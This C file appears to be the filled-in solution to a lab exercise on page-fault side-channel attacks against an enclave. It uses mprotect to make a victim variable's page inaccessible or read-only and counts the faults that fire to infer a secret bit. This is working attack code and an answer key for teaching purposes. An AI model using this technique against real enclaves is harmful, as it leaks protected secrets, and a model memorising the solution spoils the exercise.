/* utility headers */
#include "debug.h"
#include "pf.h"
#include "cacheutils.h"
#include <sys/mman.h>
#include "victim.h"

int fault_fired = 0;

void fault_handler(void *base_adrs)
{
    /* =========================== START SOLUTION =========================== */
    // check if fault is for variable a -- don't explicitly need for this experiment
    if(base_adrs == &a){
        // mark it readable and writable
        mprotect(base_adrs, 0x1000, PROT_READ | PROT_WRITE);
    }
    /* =========================== END SOLUTION =========================== */

    fault_fired++;
}

int main( int argc, char **argv )
{
    int rv = 1, secret = 1;

    /* ---------------------------------------------------------------------- */
    info("registering fault handler..");
    register_fault_handler(fault_handler);
    info("a at %p\n", &a);

    /* ---------------------------------------------------------------------- */
    info_event("inc_secret attack");

    /* =========================== START SOLUTION =========================== */
    // mark the page as NOT_ACCESSIBLE, this will invoke page fault on accessing a while doing a+=1
    mprotect(&a, 0x1000, PROT_NONE);
    ecall_inc_secret(secret);

    if(fault_fired == 1){
        info("secret = 1");
    }
    else{
        info("secret = 0");
    }
    /* =========================== END SOLUTION =========================== */

    /* ---------------------------------------------------------------------- */
    info_event("inc_secret_maccess attack");

    /* =========================== START SOLUTION =========================== */
    // make the count 0 again
    fault_fired = 0;

    // mark the page as READ_ONLY, this will invoke page fault for a+=1 as it needs writable access
    // but will not invoke page fault for b=a as it needs read access which is already given
    mprotect(&a, 0x1000, PROT_READ);
    ecall_inc_secret_maccess(secret);

    if(fault_fired == 1){
        info("secret = 1");
    }
    else{
        info("secret = 0");
    }
    /* =========================== END SOLUTION =========================== */

    /* ---------------------------------------------------------------------- */

    info("all is well; exiting..");
	return 0;
}
